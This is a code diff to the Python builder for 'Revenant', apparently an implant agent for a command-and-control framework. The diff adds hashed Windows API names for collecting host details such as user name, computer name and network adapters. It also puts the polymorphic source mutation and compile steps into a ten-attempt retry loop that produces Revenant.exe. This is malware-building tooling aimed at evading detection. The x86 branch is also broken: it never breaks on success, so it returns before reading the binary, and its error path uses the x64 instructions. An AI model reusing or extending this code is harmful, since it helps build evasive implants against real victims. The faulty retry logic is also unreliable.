@@ -146,6 +146,11 @@ eula = ["MICROSOFT SOFTWARE LICENSE TERMS", \
 
 
 plain_function_strings = [
+    "#define GetUserNameA_CRC32B                    \"GetUserNameA\"",
+    "#define GetModuleFileNameA_CRC32B              \"GetModuleFileNameA\"",
+    "#define GetCurrentProcessId_CRC32B             \"GetCurrentProcessId\"",
+    "#define GetAdaptersInfo_CRC32B                 \"GetAdaptersInfo\"",
+    "#define GetComputerNameExA_CRC32B              \"GetComputerNameExA\"",
     "#define DeviceIoControl_CRC32B                 \"DeviceIoControl\"",
     "#define CreateFileW_CRC32B                     \"CreateFileW\"",
     "#define GetSystemInfo_CRC32B                   \"GetSystemInfo\"",
@@ -190,6 +195,8 @@ plain_strings = [
     "#define S_COMMAND_EXIT           \"command exit\"",
     "#define S_WINHTTP                \"winhttp\"",
     "#define S_KERNEL32               \"kernel32.dll\"",
+    "#define S_ADVAPI32               \"advapi32.dll\"",
+    "#define S_IPHLPAPI               \"iphlpapi.dll\"",
     "#define S_MARKER_MASK            \"xxxxxxxxxxxxxxxxxxxxxxxx\""
 
 ]
@@ -476,64 +483,67 @@ class Revenant(AgentType):
             print("[*] Configuring String.h header...")
 
         if config['Options']['Arch'] == "64":
-
-            if config['Config']['Polymorphic']:
-                process_directory(directory_path, instructions_x64, eula, False)
-                print("[*] Configuring source files x64...")
-
             compile_command: str = "cmake -DARCH=x64 . && cmake --build . -j 1"
-
-            try:
-                process = subprocess.run(compile_command,
-                                         shell=True,
-                                         check=True,
-                                         stdout=subprocess.PIPE,
-                                         stderr=subprocess.PIPE,
-                                         universal_newlines=True)
-
+            for attempt in range(10): # there's a likelihood that the polymorphic will break the code, retry 10 times
                 if config['Config']['Polymorphic']:
-                    process_directory(directory_path, instructions_x64, eula, True)
-                    print("[*] Cleaning up source files...")
+                    process_directory(directory_path, instructions_x64, eula, False)
+                    print("[*] Configuring source files x64...")
+                try:
+                    process = subprocess.run(compile_command,
+                                             shell=True,
+                                             check=True,
+                                             stdout=subprocess.PIPE,
+                                             stderr=subprocess.PIPE,
+                                             universal_newlines=True)
 
-                print(process.stdout)
-            except subprocess.CalledProcessError as error:
-                print(f"Error occurred: {error.stderr}")
+                    if config['Config']['Polymorphic']:
+                        process_directory(directory_path, instructions_x64, eula, True)
+                        print("[*] Cleaning up source files...")
 
-                if config['Config']['Polymorphic']: # Retain poly for debugging
-                    #process_directory(directory_path, instructions_x64, True)
-                    print("[*] !! NOT Cleaning up source files !!")
+                    print(process.stdout)
+                    break # break on success
+                except subprocess.CalledProcessError as error:
+                    print(f"Error occurred: {error.stderr}")
 
-                return
+                    if config['Config']['Polymorphic']: # Retain poly for debugging
+                        process_directory(directory_path, instructions_x64, eula, True)
+                        print("[*] !! ERROR - Cleaning up source files !!")
+
+                if attempt >= 9:
+                    print("[*] !! ERROR - MAX ATTEMPTS!!")
+                    return
             data = open("Agent/Bin/x64/Revenant.exe", "rb").read()
 
         elif config['Options']['Arch'] == "86":
             compile_command: str = "cmake -DARCH=x86 . && cmake --build . -j 1"
-
-            if config['Config']['Polymorphic']:
-                process_directory(directory_path, instructions_x86, eula, False)
-                print("[*] Configuring source files x86...")
-
-            try:
-                process = subprocess.run(compile_command,
-                                         shell=True,
-                                         check=True,
-                                         stdout=subprocess.PIPE,
-                                         stderr=subprocess.PIPE,
-                                         universal_newlines=True)
-
+            for attempt in range(10): # there's a likelihood that the polymorphic will break the code, retry 10 times
                 if config['Config']['Polymorphic']:
-                    process_directory(directory_path, instructions_x86, eula, True)
-                    print("[*] Cleaning up source files...")
+                    process_directory(directory_path, instructions_x86, eula, False)
+                    print("[*] Configuring source files x86...")
 
-                print(process.stdout)
-            except subprocess.CalledProcessError as error:
-                print(f"Error occurred: {error.stderr}")
+                try:
+                    process = subprocess.run(compile_command,
+                                             shell=True,
+                                             check=True,
+                                             stdout=subprocess.PIPE,
+                                             stderr=subprocess.PIPE,
+                                             universal_newlines=True)
 
-                if config['Config']['Polymorphic']:
-                    process_directory(directory_path, instructions_x64, eula, True)
-                    print("[*] Cleaning up source files...")
+                    if config['Config']['Polymorphic']:
+                        process_directory(directory_path, instructions_x86, eula, True)
+                        print("[*] Cleaning up source files...")
 
-                return
+                    print(process.stdout)
+                except subprocess.CalledProcessError as error:
+                    print(f"Error occurred: {error.stderr}")
+
+                    if config['Config']['Polymorphic']:
+                        process_directory(directory_path, instructions_x64, eula, True)
+                        print("[*] Cleaning up source files...")
+
+                if attempt >= 9:
+                    print("[*] !! ERROR - MAX ATTEMPTS!!")
+                    return
 
             data = open("Agent/Bin/x86/Revenant.exe", "rb").read()
 
